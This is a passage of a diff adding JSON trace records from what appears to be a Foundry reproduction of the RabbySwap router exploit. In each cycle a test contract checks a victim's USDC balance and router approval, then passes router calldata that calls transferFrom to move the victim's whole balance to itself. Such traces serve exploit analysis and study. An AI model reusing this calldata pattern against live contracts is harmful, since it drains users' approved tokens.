+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3",
+        "original_code": null,
+        "description": null,
+        "return_value": "2520001416 [2.52e9]"
+    },
+    {
+        "id": "2529",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3",
+        "original_code": null,
+        "description": null,
+        "return_value": "2520001416 [2.52e9]"
+    },
+    {
+        "id": "3426",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913029639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913029639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000b9afb68de4e1f89aca813ca75d87bd86a1a17aa30000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000096342b88, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2520001416 [2.52e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xB9AFb68de4E1f89acA813ca75d87bd86a1a17aa3, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2520001416 [2.52e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f",
+        "original_code": null,
+        "description": null,
+        "return_value": "172860926 [1.728e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f",
+        "original_code": null,
+        "description": null,
+        "return_value": "172860926 [1.728e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "60000000 [6e7]"
+    },
+    {
+        "id": "2637",
+        "args": "0xC10898edA672fDFc4Ac0228bB1Da9b2bF54C768f, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "60000000 [6e7]"
+    },
+    {
+        "id": "3315",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a",
+        "original_code": null,
+        "description": null,
+        "return_value": "21022291 [2.102e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a",
+        "original_code": null,
+        "description": null,
+        "return_value": "21022291 [2.102e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912719639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912719639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000073b37009778048f6db88fd602582473e74e5019a0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000140c653, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21022291 [2.102e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x73B37009778048f6dB88fD602582473e74e5019a, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 21022291 [2.102e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb",
+        "original_code": null,
+        "description": null,
+        "return_value": "6213479 [6.213e6]"
+    },
+    {
+        "id": "2529",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb",
+        "original_code": null,
+        "description": null,
+        "return_value": "6213479 [6.213e6]"
+    },
+    {
+        "id": "3426",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913122639935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913122639935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd000000000000000000000000bb4b297cc5257d8ab7f280361c96b3a27014ebbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e149600000000000000000000000000000000000000000000000000000000005ecf67, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6213479 [6.213e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0xbB4b297cC5257D8ab7F280361C96b3A27014EbBb, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6213479 [6.213e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf",
+        "original_code": null,
+        "description": null,
+        "return_value": "500819419 [5.008e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf",
+        "original_code": null,
+        "description": null,
+        "return_value": "500819419 [5.008e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007911334212866 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007911334212866 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000005be2539baa7622865fdc401ba26adb636d78f5bf0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000001dd9e5db, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500819419 [5.008e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x5BE2539BaA7622865FDc401bA26adB636d78f5Bf, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 500819419 [5.008e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7",
+        "original_code": null,
+        "description": null,
+        "return_value": "10619279124 [1.061e10]"
+    },
+    {
+        "id": "2529",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7",
+        "original_code": null,
+        "description": null,
+        "return_value": "10619279124 [1.061e10]"
+    },
+    {
+        "id": "3426",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007895527139935 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007895527139935 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000025939e70dc19ef0aa2819f5c6544712a36eebfa70000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000278f55714, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10619279124 [1.061e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x25939E70Dc19ef0aa2819f5c6544712a36eEbfa7, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10619279124 [1.061e10]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85",
+        "original_code": null,
+        "description": null,
+        "return_value": "108531245 [1.085e8]"
+    },
+    {
+        "id": "2529",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85",
+        "original_code": null,
+        "description": null,
+        "return_value": "108531245 [1.085e8]"
+    },
+    {
+        "id": "3426",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912984650345 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007912984650345 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd0000000000000000000000005853ed4f26a3fcea565b3fbc698bb19cdf6deb850000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000006780e2d, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 108531245 [1.085e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x5853eD4f26A3fceA565b3FBC698bb19cdF6DEB85, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 108531245 [1.085e8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3315",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b",
+        "original_code": null,
+        "description": null,
+        "return_value": "25565533 [2.556e7]"
+    },
+    {
+        "id": "2529",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b",
+        "original_code": null,
+        "description": null,
+        "return_value": "25565533 [2.556e7]"
+    },
+    {
+        "id": "3426",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913101107202 [1.157e77]"
+    },
+    {
+        "id": "2637",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b, RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "115792089237316195423570985008687907853269984665640564039457584007913101107202 [1.157e77]"
+    },
+    {
+        "id": "42626",
+        "args": "USDT_TOKEN: [0xdAC17F958D2ee523a2206206994597C13D831ec7], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4660, USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 0x23b872dd00000000000000000000000073a6b16ad155acd15f1a69e61369db883dfc0b0b0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496000000000000000000000000000000000000000000000000000000000186195d, 1665486251 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "5258",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "1356",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1], USDC_TOKEN: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "13592",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 25565533 [2.556e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "12797",
+        "args": "0x73a6b16aD155aCd15F1A69e61369DB883dFC0b0b, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 25565533 [2.556e7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "708",
+        "args": "RABBYSWAP_ROUTER: [0x6eb211CAF6d304A76efE37D9AbDFAdDC2d4363d1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "100000000000000000000 [1e20]"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "862",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 99125000000000000000 [9.912e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "3979",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x20077089045530FEdEbeAdA65b42F1ffAc9d5e85, 875000000000000000 [8.75e17]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
